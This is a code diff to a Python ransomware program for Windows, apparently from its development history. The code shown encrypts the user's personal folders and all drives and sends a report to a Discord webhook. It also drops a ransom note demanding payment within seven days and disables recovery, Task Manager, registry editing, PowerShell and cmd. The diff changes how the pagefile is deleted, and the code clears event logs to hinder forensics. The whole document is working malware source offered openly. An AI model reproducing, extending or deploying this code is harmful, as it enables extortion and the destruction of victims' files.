@@ -11,6 +11,7 @@ import base64
 import string
 import winreg
 import ctypes
+import getpass
 import hashlib
 import subprocess
 from datetime import datetime
@@ -19,9 +20,9 @@ from concurrent.futures import ThreadPoolExecutor
 
 import requests
 import winshell
-from Crypto.Cipher import AES
-from file_crypto import encrypt_file
+from Crypto.Cipher import AES # hidden import
 from win32com.client import Dispatch
+from file_crypto import encrypt_file # type: ignore
 from discord_webhook import DiscordEmbed, DiscordWebhook
 
 YOUR_WEBHOOK_URL = ""
@@ -79,12 +80,6 @@ def disable_task_manager():
 def disable_recovery():
     execute_command("reagentc /disable")
     execute_command("bcdedit /set {default} recoveryenabled No")
-
-
-def disable_ram_dump():
-    reg_path = r"System\CurrentControlSet\Control\CrashControl"
-    with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, reg_path) as reg:
-        winreg.SetValueEx(reg, "CrashDumpEnabled", 0, winreg.REG_DWORD, 0)
 
 
 def clear_event_logs():
@@ -311,13 +306,13 @@ def start_encryption():
     )
     webhook.add_embed(embed)
     webhook.execute()
-    with open(os.path.join(os.environ["USERPROFILE"], "key"), "wb") as f:
+    with open(os.path.join(f"C:\\Users\\{getpass.getuser()}", "key"), "wb") as f:
         f.write(hashlib.sha256(key).hexdigest().encode())
-    encrypt_directory(os.path.join(os.environ["USERPROFILE"], "Desktop"), key)
-    encrypt_directory(os.path.join(os.environ["USERPROFILE"], "Downloads"), key)
-    encrypt_directory(os.path.join(os.environ["USERPROFILE"], "Documents"), key)
-    encrypt_directory(os.path.join(os.environ["USERPROFILE"], "Pictures"), key)
-    encrypt_directory(os.path.join(os.environ["USERPROFILE"], "Videos"), key)
+    encrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Desktop"), key)
+    encrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Downloads"), key)
+    encrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Documents"), key)
+    encrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Pictures"), key)
+    encrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Videos"), key)
     bitmask = ctypes.windll.kernel32.GetLogicalDrives()
     for disk in [
         f"{letter}:/"
@@ -381,7 +376,7 @@ To get them back, you need to follow the instructions below.
 - If you don't pay within 7 days, all your files will no longer be decryptable!!!
 
 Don't Cry =}}"""
-    file_path = os.path.join(os.environ["USERPROFILE"], r"Desktop\README.txt")
+    file_path = os.path.join(f"C:\\Users\\{getpass.getuser()}", r"Desktop\README.txt")
     with open(file_path, "w") as f:
         f.write(msg)
     startup = winshell.startup()
@@ -392,12 +387,8 @@ Don't Cry =}}"""
     shortcut.Arguments = file_path
     shortcut.save()
     file_path = os.path.join(os.getenv("SystemDrive"), "pagefile.sys")
-    try:
-        with open(file_path, "w") as f:
-            f.write(os.urandom(os.path.getsize(file_path)))
-        os.remove(file_path)
-    except:
-        pass
+    execute_command('wmic computersystem where name="%computername%" set AutomaticManagedPagefile=False')
+    execute_command(f"wmic pagefileset where \"name='{os.getenv("SystemDrive")}\\pagefile.sys'\" delete")
     clear_event_logs()
     execute_command("shutdown /r /f /t 2")
     disable_cmd()
@@ -410,7 +401,6 @@ def execute_command(command, shell=True):
 
 
 def disable_all():
-    disable_ram_dump()
     disable_regedit()
     disable_powershell()
     disable_recovery()
